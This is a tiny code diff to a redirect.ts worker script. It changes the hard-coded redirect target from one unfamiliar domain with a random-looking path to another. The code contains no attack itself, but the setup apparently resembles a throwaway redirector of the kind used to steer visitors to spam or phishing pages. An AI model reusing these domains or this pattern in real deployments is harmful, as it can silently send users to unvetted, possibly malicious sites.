@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://lightedgee.com/DeRHdtUP"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://netvigatol.com/choiceone/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
